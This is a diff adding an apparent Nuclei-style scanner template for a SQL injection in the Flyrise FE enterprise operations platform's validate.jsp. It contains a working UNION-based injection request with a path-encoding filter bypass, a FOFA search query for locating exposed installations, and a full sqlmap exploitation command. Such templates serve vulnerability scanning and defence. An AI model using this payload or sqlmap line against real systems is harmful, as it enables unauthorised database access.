@@ -1,0 +1,29 @@
+id: flyrise-validate-sqli
+info:
+  name: 飞企互联 FE 企业运营管理平台 validate.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 飞企互联-FE企业运营管理平台 validate.jsp 存在SQL注入漏洞
+  reference: 
+    - demo
+  metadata:
+    verified: true
+    fofa-query: app="飞企互联-FE企业运营管理平台"
+    sqlmap: sqlmap -r sqli.txt --dbms=mssql --level 5 --batch --tamper=space2comment --risk 3
+  tags: flyrise,sqli,fe
+
+http:
+  - raw:
+      - |
+        POST /mobile/validate.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        json={"relId":"1'+UNION+ALL+SELECT+sys.fn_sqlvarbasetostr(HashBytes('MD5','1'))%2CNULL%2CNULL--+wMCa","type":"0"}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,md5(1))
+        condition: and
